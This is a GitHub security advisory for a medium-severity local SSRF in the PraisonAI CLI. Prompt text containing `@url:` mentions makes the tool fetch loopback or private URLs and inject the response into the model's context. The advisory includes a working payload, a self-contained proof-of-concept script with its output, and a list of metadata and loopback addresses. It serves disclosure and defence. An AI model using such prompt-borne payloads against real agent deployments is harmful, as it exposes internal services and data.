# [M] PraisonAI CLI automatically resolves @url mentions in prompt text and can read loopback URLs into model context

## Summary
Severity: Medium
Advisory: GHSA-5cxw-77wg-jrf3
CVE: CVE-2026-47395
CWE: CWE-200
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2026-05-29
Source: https://github.com/advisories/GHSA-5cxw-77wg-jrf3
Type: github-advisory

## Affected
- PyPI: `praisonaiagents` — affected >=0 <1.6.40
- PyPI: `PraisonAI` — affected >=0 <4.6.40

## Details
### Summary

PraisonAI's direct-prompt CLI automatically expands `@url:` mentions in raw prompt text before agent execution begins.

If a prompt contains `@url:<http-or-https-url>`, the CLI calls `MentionsParser.process(...)`. The `@url:` handler then performs a direct `urllib.request.urlopen()` request to the attacker-controlled URL and returns the response body. That response body is prepended to the final model prompt context.

There is no loopback/private-address restriction, no metadata-service restriction, and no approval gate before the fetch.

As a result, attacker-influenced prompt text can cause the operator's machine to fetch localhost-only HTTP resources and inject the response into model context.

Example:

```text
@url:http://localhost.:8766/ summarize this
````

This causes PraisonAI to make an HTTP request to the local machine and prepend the fetched response body to the prompt that the model receives.

This is a narrow local SSRF / local content disclosure issue in automatic prompt preprocessing. It is not a remote server takeover.

### Details

The affected direct-prompt CLI path is in:

```text
src/praisonai/praisonai/cli/main.py
```

The CLI imports and instantiates `MentionsParser` on the direct prompt path:

```python
from praisonaiagents.tools.mentions import MentionsParser

parser = MentionsParser(workspace_path=os.getcwd())

if parser.has_mentions(prompt):
    mention_context, prompt = parser.process(prompt)

if mention_context:
    prompt = f"{mention_context}# Task:\n{prompt}"
```

This means raw prompt text is interpreted as a mention language before query rewriting, prompt expansion, tool execution, or LLM invocation.

The affected mention implementation is in:

```text
src/praisonai-agents/praisonaiagents/tools/mentions.py
```

`@url:` is a first-class mention type:

```python
PATTERNS = {
    "file": re.compile(r'@file:([^\s]+)'),
    "web": re.compile(r'@web:([^\s]+(?:\s+[^\s@]+)*)'),
    "doc": re.compile(r'@doc:([^\s]+)'),
    "rule": re.compile(r'@rule:([^\s]+)'),
    "url": re.compile(r'@url:(https?://[^\s]+)'),
}
```

The URL mention handler performs an unrestricted HTTP request:

```python
req = urllib.request.Request(
    url,
    headers={'User-Agent': 'Mozilla/5.0 (compatible; PraisonAI/1.0)'}
)

with urllib.request.urlopen(req, timeout=10) as response:
    content = response.read().decode('utf-8', errors='ignore')
```

There is no validation rejecting:

```text
127.0.0.1
localhost
localhost.
private RFC1918 addresses
link-local addresses
cloud metadata endpoints
other local-only HTTP services
```

The returned body is added to the generated mention context and then prepended to the prompt.

The resulting chain is:

```text
attacker-influenced prompt text
  -> @url:http://localhost.:8766/
  -> direct-prompt CLI calls MentionsParser.process(...)
  -> _process_url_mention(...)
  -> urllib.request.urlopen(attacker URL)
  -> loopback HTTP response body is read
  -> response body is injected into model prompt context
```

### PoC

The following PoC is non-destructive. It starts a local HTTP server on `127.0.0.1:8766`, passes a prompt containing `@url:http://localhost.:8766/` through the real `MentionsParser.process(...)` implementation, and confirms that the local response body is injected into the generated prompt context.

#### Full PoC

```python
#!/usr/bin/env python3
"""Self-contained local replay for PraisonAI CLI @url mention loopback fetch."""

from __future__ import annotations

import sys
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path


REPO_ROOT = Path(__file__).resolve().parents[3] / "repos" / "praisonai"
PRAISON_ROOT = REPO_ROOT / "src" / "praisonai"
AGENTS_ROOT = REPO_ROOT / "src" / "praisonai-agents"
CLI_MAIN = PRAISON_ROOT / "praisonai/cli/main.py"
MENTIONS = AGENTS_ROOT / "praisonaiagents/tools/mentions.py"


def verify_source() -> None:
    expected = {
        CLI_MAIN: [
            "from praisonaiagents.tools.mentions import MentionsParser",
            "if parser.has_mentions(prompt):",
            "mention_context, prompt = parser.process(prompt)",
            'prompt = f"{mention_context}# Task:\\n{prompt}"',
        ],
        MENTIONS: [
            '"url": re.compile(r\'@url:(https?://[^\\s]+)\')',
            "def _process_url_mention(self, url: str) -> Optional[str]:",
            "with urllib.request.urlopen(req, timeout=10) as response:",
        ],
    }

    for path, needles in expected.items():
        text = path.read_text(encoding="utf-8")
        for needle in needles:
            if needle not in text:
                raise RuntimeError(f"source verification failed: {needle!r} not found in {path}")


class _Handler(BaseHTTPRequestHandler):
    hits: list[tuple[str, str | None]] = []
    body = b"<html><body>secret-local-page</body></html>"

    def do_GET(self) -> None:  # noqa: N802
        self.__class__.hits.append((self.path, self.headers.get("Host")))
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(self.body)))
        self.end_headers()
        self.wfile.write(self.body)

    def log_message(self, format: str, *args) -> None:  # noqa: A003
        return


def main() -> int:
    if not CLI_MAIN.exists() or not MENTIONS.exists():
        raise SystemExit("missing local PraisonAI source tree")

    verify_source()

    sys.path.insert(0, str(AGENTS_ROOT))
    from praisonaiagents.tools.mentions import MentionsParser

    _Handler.hits.clear()

    server = HTTPServer(("127.0.0.1", 8766), _Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()

    try:
        parser = MentionsParser(workspace_path="/tmp")
        context, cleaned = parser.process("@url:http://localhost.:8766/ summarize this")
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=1)

    print("[poc] cli_path_verified=yes")
    print("[poc] mention_impl_verified=yes")
    print(f"[poc] cleaned_prompt={cleaned}")
    print(f"[poc] loopback_hit_count={len(_Handler.hits)}")

    if _Handler.hits:
        print(f"[poc] loopback_host={_Handler.hits[0][1]}")

    print(f"[poc] context_contains_secret={'secret-local-page' in context}")

    if cleaned != "summarize this":
        raise SystemExit(f"[poc] MISS: unexpected cleaned prompt {cleaned!r}")

    if not _Handler.hits:
        raise SystemExit("[poc] MISS: no loopback HTTP request observed")

    if "secret-local-page" not in context:
        raise SystemExit("[poc] MISS: local response body was not injected into prompt context")

    print("[poc] HIT: @url mention fetched loopback content and injected it into prompt context")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

#### Observed output

```text
[poc] cli_path_verified=yes
[poc] mention_impl_verified=yes
[poc] cleaned_prompt=summarize this
[poc] loopback_hit_count=1
[poc] loopback_host=localhost.:8766
[poc] context_contains_secret=True
[poc] HIT: @url mention fetched loopback content and injected it into prompt context
```

#### Expected secure behavior

A prompt-borne `@url:` mention should not be able to read loopback or private-network resources by default.

At minimum, the following should be rejected before any HTTP request is made:

```text
http://127.0.0.1/
http://localhost/
http://localhost./
http://169.254.169.254/
private RFC1918 addresses
link-local addresses
```

#### Actual vulnerable behavior

The loopback request succeeds, and the returned local content is inserted into the generated prompt context.

### Impact

An attacker who can influence prompt text passed to PraisonAI's direct-prompt CLI can cause the operator's machine to perform local HTTP requests and inject the fetched response body into the model prompt context.

Potential impact includes:

* reading localhost-only HTTP resources;
* reading local dashboards, admin panels, development servers, or internal web services bound to loopback;
* exposing fetched local content to the model prompt;
* exposing fetched local content through downstream logs, traces, model output, or agent memory depending on the operator workflow.

This report does not claim unauthenticated remote server takeover. The attacker must influence the prompt text that an operator runs with the direct-prompt CLI.

## References
- https://github.com/MervinPraison/PraisonAI/security/advisories/GHSA-5cxw-77wg-jrf3
- https://github.com/MervinPraison/PraisonAI
